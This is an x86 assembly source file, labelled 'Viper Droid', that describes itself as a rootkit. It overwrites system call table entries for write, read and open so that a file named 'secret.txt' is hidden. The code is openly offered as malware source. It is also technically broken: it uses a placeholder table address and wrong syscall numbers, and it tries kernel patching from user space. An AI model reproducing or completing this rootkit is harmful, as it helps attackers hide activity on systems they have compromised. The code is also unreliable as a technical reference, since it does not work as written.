[BITS 32]
global _start
;Viper Droid
_start:
    ; Save the original sys_call_table address
    mov eax, 0xffffffff  ; Placeholder for sys_call_table address
    mov ebx, [eax + 4 * 4]  ; sys_write is the 4th entry in the table
    mov [original_sys_write], ebx
    mov ebx, [eax + 5 * 4]  ; sys_read is the 5th entry in the table
    mov [original_sys_read], ebx
    mov ebx, [eax + 2 * 4]  ; sys_open is the 2nd entry in the table
    mov [original_sys_open], ebx

    ; Hook sys_write, sys_read, and sys_open
    mov dword [eax + 4 * 4], hooked_sys_write
    mov dword [eax + 5 * 4], hooked_sys_read
    mov dword [eax + 2 * 4], hooked_sys_open

    ; Infinite loop to keep the rootkit running
    jmp $

hooked_sys_write:
    ; Check if the file being written is "secret.txt"
    pusha
    mov esi, [esp + 36]  ; File descriptor (1 = stdout)
    cmp esi, 1
    jne .original_write

    ; Check the buffer for "secret.txt"
    mov edi, [esp + 40]  ; Buffer address
    mov ecx, 10          ; Length of "secret.txt"
    mov esi, secret_file
    repe cmpsb
    jne .original_write

    ; If "secret.txt" is found, skip writing
    popa
    ret

.original_write:
    ; Restore the original sys_write
    popa
    jmp [original_sys_write]

hooked_sys_read:
    ; Check if the file being read is "secret.txt"
    pusha
    mov esi, [esp + 36]  ; File descriptor (0 = stdin)
    cmp esi, 0
    jne .original_read

    ; Check the buffer for "secret.txt"
    mov edi, [esp + 40]  ; Buffer address
    mov ecx, 10          ; Length of "secret.txt"
    mov esi, secret_file
    repe cmpsb
    jne .original_read

    ; If "secret.txt" is found, skip reading
    popa
    ret

.original_read:
    ; Restore the original sys_read
    popa
    jmp [original_sys_read]

hooked_sys_open:
    ; Check if the file being opened is "secret.txt"
    pusha
    mov esi, [esp + 36]  ; File path
    mov ecx, 10          ; Length of "secret.txt"
    mov edi, secret_file
    repe cmpsb
    jne .original_open

    ; If "secret.txt" is found, return an error
    popa
    mov eax, -1          ; Return -1 (error)
    ret

.original_open:
    ; Restore the original sys_open
    popa
    jmp [original_sys_open]

secret_file db "secret.txt", 0
original_sys_write dd 0
original_sys_read dd 0
original_sys_open dd 0
